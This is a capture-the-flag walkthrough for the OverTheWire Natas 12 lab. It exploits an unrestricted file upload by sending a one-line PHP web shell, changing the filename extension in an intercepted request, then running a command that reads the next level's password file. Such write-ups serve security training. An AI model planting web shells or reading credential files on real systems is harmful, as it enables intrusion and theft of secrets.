# Natas12
#natas #remote-code-execution #burp-suite 
## Vulnerability:
The web application does not properly validate uploaded files and allows users to upload PHP files that can be executed by the server.
## Technique:
Uploaded a malicious PHP file to achieve remote code execution.
#### Steps:
###### 1) Analyzing the source code
```php
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters) - 1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
        $path = $dir . "/" . genRandomString() . "." . $ext;
    } while (file_exists($path));

    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if (array_key_exists("filename", $_POST)) {

    $target_path = makeRandomPathFromFilename(
        "upload",
        $_POST["filename"]
    );

    if (filesize($_FILES["uploadedfile"]["tmp_name"]) > 1000) {

        echo "File is too big";

    } else {

        if (move_uploaded_file(
            $_FILES["uploadedfile"]["tmp_name"],
            $target_path
        )) {

            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";

        } else {

            echo "There was an error uploading the file, please try again!";

        }
    }
}

?>
```
The source code reveals that the application saves the file with a random name.
###### 2) Creating the PHP file
```php
<?php system($_GET["cmd"]); ?>
```
- `$_GET` reads the `cmd` parameter in the URL.
- `system()` executes the command received from `$_GET['cmd']`.
###### 3) Uploading the malicious PHP file

<img width="1872" height="627" alt="image" src="https://github.com/user-attachments/assets/66a77b47-49b0-48f7-93d9-125573ca1c55" />

<img width="1198" height="276" alt="image" src="https://github.com/user-attachments/assets/8553fab2-825c-4665-89eb-517ef3b9113f" />

The file was saved with a `.jpg` extension, so the server does not execute it as a PHP script.
By inspecting the upload request, we can see that the filename is provided as a parameter and can be modified to use a `.php` extension:
```http
POST /index.php HTTP/1.1
Host: natas12.natas.labs.overthewire.org
Content-Length: 442
Cache-Control: max-age=0
Authorization: Basic <REDACTED>
Accept-Language: en-US,en;q=0.9
Origin: http://natas12.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeB3FX0A3xF2jnaGE
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas12.natas.labs.overthewire.org/index.php
Accept-Encoding: gzip, deflate, br
Cookie: <REDACTED>
Connection: keep-alive

------WebKitFormBoundaryeB3FX0A3xF2jnaGE
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
------WebKitFormBoundaryeB3FX0A3xF2jnaGE
Content-Disposition: form-data; name="filename"

t0lxarz5b0.jpg
------WebKitFormBoundaryeB3FX0A3xF2jnaGE
Content-Disposition: form-data; name="uploadedfile"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET["cmd"]); ?>

------WebKitFormBoundaryeB3FX0A3xF2jnaGE--
```
We can change `t0lxarz5b0.jpg` to `php` extension for example:

**Result:**
```http
HTTP/1.1 200 OK
Date: Tue, 04 Aug 2026 08:25:12 GMT
Server: Apache/2.4.66 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 976
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```
```html
<html>
<head>
    <!-- This stuff in the header has nothing to do with the level -->
    <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css">
    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css">

    <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
    <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
    <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script>
    <script src="http://natas.labs.overthewire.org/js/wechall.js"></script>

    <script>
        var wechallinfo = {
            "level": "natas12",
            "pass": "<NATAS11_PASSWORD>"
        };
    </script>
</head>

<body>
    <h1>natas12</h1>

    <div id="content">
        The file
        <a href="upload/4r7pgo9trn.php">upload/4r7pgo9trn.php</a>
        has been uploaded

        <div id="viewsource">
            <a href="index-source.html">View sourcecode</a>
        </div>
    </div>
</body>
</html>
```
The file is now saved as `4r7pgo9trn.php`.
###### 4) Remote code execution
As we previously know that the passwords are stored in `/etc/natas_webpass`, we'll use the URL:
```
http://natas12.natas.labs.overthewire.org/upload/4r7pgo9trn.php?cmd=cat%20/etc/natas_webpass/natas13
```
To get the password for Natas13 Level.

**Result:**
```
<PASSWORD>
```
## Password found:
[Not disclosed — solve it yourself!]
## Previous Level:
[Natas11](./Natas11.md)
## Next Level:
[Natas13](./Natas13.md)
